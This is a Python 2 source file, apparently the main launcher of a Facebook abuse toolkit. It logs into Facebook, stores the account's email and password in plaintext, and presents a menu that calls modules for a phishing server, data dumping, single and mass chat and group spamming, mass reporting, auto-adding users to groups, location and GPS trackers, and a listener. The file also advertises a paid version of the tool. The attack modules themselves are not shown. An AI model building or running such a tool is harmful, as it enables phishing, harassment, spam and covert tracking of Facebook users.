#-*-coding:utf-8-*-
# Coded By Deray
# Report Bug On My Other Sosmed
# instagram: @reyy05_
# facebook: https://facebook.com/achmad.luthfi.hadi.3
'''
	 Rebuild Copyright Can't make u real programmer
'''


from data import banner
banner.cekPlatform()
from data import listen
from data import cache
from data.color import *
from data import reports
from data import dumpper
from data import risetPass
from data import create_server
from data import chatSpammer
from data import grupSpammer
from data import multiBruteforce
from data import reportContent
from data import auto_addgrup
import os,sys,requests,bs4,json,time,subprocess

cache.cleanCache()

def login():
	req=requests.Session()
	e=raw_input(
	"[!] No Account Detected\n[*] Login Your Fb\n[?] Username: ")
	p=raw_input("[?] Password: ")
	print("[*] Login ...")
	s=req.post("https://mbasic.facebook.com/login",
		data=
			{
				"email":e,
				"pass":p
			}
	).url
	if "save-device" in s or "m_sess" in s:
		i=json.dumps({
			"email":e,
			"pass":p,
			"name":bs4.BeautifulSoup(req.get(
				"https://mbasic.facebook.com/me").text,
			features="html.parser").find("title").text
		})
		open("config/config.json","w").write(i)
		print("[*] Login Success..")
		time.sleep(2)
		os.system("clear")
		os.system("python2 asu.py")
	else:
		print("[!] Login Failed.")
		raw_input("[*] Press enter to again...")
		os.system("clear")
		login()
		
class ASU:
	def __init__(self):
		try:
			print(banner._asu_banner())
			self.aso()
		except Exception as f:
			print("%s[!]%s %s"%(R,N,f))
			os.sys.exit("%s[-%s User Exit."%(R,N))
	
	def aso(self):
		try:
			asw=raw_input("%s[%s+%s]%s @deray_> "%(G,R,G,N))
		except:
			sys.exit("%s[!]%s User Interrupt."%(R,N))
		if (asw == ""):
			return self.aso()
		elif (asw =="1" or asw == "01"):
			create_server.phising()
		elif (asw == ""):
			pass
		elif (asw == "2" or asw == "02"):
			dumpper.pilihan()
		elif (asw == "3" or asw == "03"):
			try:
				print("\n\t[ Select Actions ]\n")
				print("  {%s01%s} Single Chat Spammer"%(G,N))
				print("  {%s02%s} Mass Chat Spammer With List Of ID Targets"%(G,N))
				try:
					r=raw_input("\n%s[%s+%s]%s Actions>> "%(
					G,R,G,N))
				except:
						sys.exit("%s[!]%s User Interrupt."%(R,N))
				if (r == "1" or r == "01"):
					try:
						chatSpammer.SPAMMER()
					except Exception as __errors__:
						print("[!] %s"%(__errors__))
				elif (r == "2" or r == "02"):
					chatSpammer.massal()
				else:sys.exit("[!] Invalid Options!")
			except Exception as f:
				print("%s[!]%s %s"%(R,N,f))
				sys.exit("\n[- User Interrupt.")
		elif (asw == "4" or asw == "04"):
			try:
				print("\n\t[ Select Actions ]\n")
				print("  {%s01%s} Single Group Spam"%(G,N))
				print("  {%s02%s} Mass Spam"%(G,N))
				try:
					r=raw_input("\n%s[%s+%s]%s Actions>> "%(
					G,R,G,N))
				except:
						sys.exit("%s[!]%s User Interrupt."%(R,N))
				if (r == "1" or r == "01"):
					try:
						grupSpammer._grupSpammer()
					except Exception as __errors__:
						print("[!] %s"%(__errors__))
				elif (r == "2" or r == "02"):
					grupSpammer._spamMassal()
				else:sys.exit("[!] Invalid Options!")
			except Exception as f:
				print("%s[!]%s %s"%(R,N,f))
				sys.exit("\n[- User Interrupt.")
		elif (asw == "5" or asw == "05"):
			print "\n\t[ Select Actions ]\n"
			print "{%s01%s} Report Status"%(G,N)
			print "{%s02%s} Mass Report"%(G,N)
			i=raw_input("\n%s[%s+%s] %sActions>> "%(
			G,R,G,N))
			if (i == "1" or i == "01"):
				reportContent.reportContent()
			elif (i == "2" or i == "02"):
				reports.report()
			else:sys.exit("%s[!]%s invalid options!"%(R,N))
		elif (asw == "6" or asw == "06"):
			auto_addgrup.grup()
		elif (asw == "7" or asw == "07"):
			risetPass.risetPass()
		elif (asw == "8" or asw == "08"):
			create_server.locator()
		elif (asw == "9" or asw == "09"):
			create_server.gps()
		elif (asw == "10"):
			listen.listen()
		elif (asw == "11"):
			login()
		elif (asw == "12"):
			print("""
[!] v5 price: Rp.100K

  [1] V.5def Tutorial
  [2] V.5def Full Tutorial
  [3] Contact Admin or report bug""")
			s=raw_input("\n[?] Select Number: ")
			if s =="1":
				s=subprocess.check_output(
					["am","start","https://youtu.be/07_fnopB6pY"])
			elif s =="2":
				s=subprocess.check_output(
					["am","start","https://youtu.be/c56xof-Cq6k"])
			elif s =="3":
				s=subprocess.check_output(
					["am","start","https://api.whatsapp.com/send?phone=62895353484895&text=hi%20admin"])
			else:
				exit("[!] Invalid options.")
		elif (asw.lower() == "banner"):
			banner.cekPlatform()
			print(banner._asu_banner())
			self.aso()
		else:
			print("[- invalid options: "+asw)
			return self.aso()


if __name__ == "__main__":
	if os.path.exists("config"):
		if os.path.exists("config/config.json"):
			if os.path.getsize("config/config.json") !=0:
				ASU()
			else:
				login()
		else:
			open("config/config.json","w").close()
			login()
	else:
		os.mkdir("config")
		open("config/config.json","w").close()
		login()
